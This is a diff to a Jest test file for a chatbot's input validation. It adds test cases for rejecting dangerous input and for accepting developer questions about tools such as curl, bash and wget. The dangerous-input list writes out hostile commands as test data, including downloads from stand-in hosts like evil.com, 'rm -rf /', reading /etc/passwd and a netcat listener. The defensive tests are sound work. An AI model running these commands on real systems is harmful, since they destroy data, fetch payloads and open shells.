@@ -6,6 +6,7 @@ import jwt from 'jsonwebtoken';
 import config from '../../config/config';
 import bcrypt from 'bcryptjs';
 import { connectRedis, disconnectRedis, getRedisClient } from '../../services/redis';
+import { rateLimiter } from '../../services/rateLimiter';
 
 // Mock OpenAI service
 jest.mock('../../services/openai', () => ({
@@ -183,9 +184,8 @@ describe('Chatbot Resolvers', () => {
         role: UserRole.USER
       });
       
-      // Clear rate limits for this user
-      const redisClient = getRedisClient();
-      await redisClient.del(`chatbot:${freshUser._id}`);
+      // Clear rate limits for this user using the correct prefixed key
+      await rateLimiter.reset(`chatbot:${freshUser._id}`);
     });
 
     const dangerousInputs = [
@@ -195,13 +195,18 @@ describe('Chatbot Resolvers', () => {
       { input: '$(cat /etc/passwd)', reason: 'command substitution' },
       { input: 'test `whoami`', reason: 'backtick execution' },
       { input: 'look at ../../../etc/passwd', reason: 'path traversal' },
-      { input: 'curl http://malware.com/payload', reason: 'curl command' },
-      { input: 'run bash script', reason: 'bash keyword' },
-      { input: 'use python to hack', reason: 'python keyword' },
+      { input: 'curl http://malware.com/payload', reason: 'curl with URL' },
+      { input: 'curl -X POST http://evil.com', reason: 'curl with flags' },
+      { input: 'bash -c "rm -rf /"', reason: 'bash execution context' },
+      { input: 'python -c "import os"', reason: 'python execution context' },
+      { input: 'perl -e "system(cmd)"', reason: 'perl one-liner' },
       { input: 'eval(malicious)', reason: 'eval function' },
       { input: 'exec(command)', reason: 'exec function' },
       { input: 'test%00null', reason: 'null byte injection' },
       { input: 'path%2f%2e%2e%2fetc', reason: 'URL-encoded traversal' },
+      { input: 'wget http://evil.com/malware', reason: 'wget download' },
+      { input: 'chmod 777 /etc/passwd', reason: 'chmod with permissions' },
+      { input: 'nc -lvp 4444', reason: 'netcat listener' },
     ];
 
     it.each(dangerousInputs)(
@@ -231,14 +236,22 @@ describe('Chatbot Resolvers', () => {
       'How do you handle database connections?',
       'What is your approach to testing?',
       'Can you explain microservices architecture?',
+      // Developer questions about technologies (should NOT be blocked)
+      'What is your experience with Python?',
+      'Can you explain bash scripting?',
+      'Tell me about Perl regex',
+      'How do you use curl for API testing?',
+      'What is wget used for?',
+      'Explain the eval function in JavaScript',
+      'How does exec work in Node.js?',
+      'What are chmod permissions?',
     ];
 
     it.each(safeInputs)(
       'should accept safe input: %s',
       async (question) => {
-        // Clear rate limit before each safe input test
-        const redisClient = getRedisClient();
-        await redisClient.del(`chatbot:${freshUser._id}`);
+        // Clear rate limit before each safe input test using the correct prefixed key
+        await rateLimiter.reset(`chatbot:${freshUser._id}`);
         
         const context = { user: { id: freshUser._id, role: freshUser.role } };
         const response = await executeOperation(
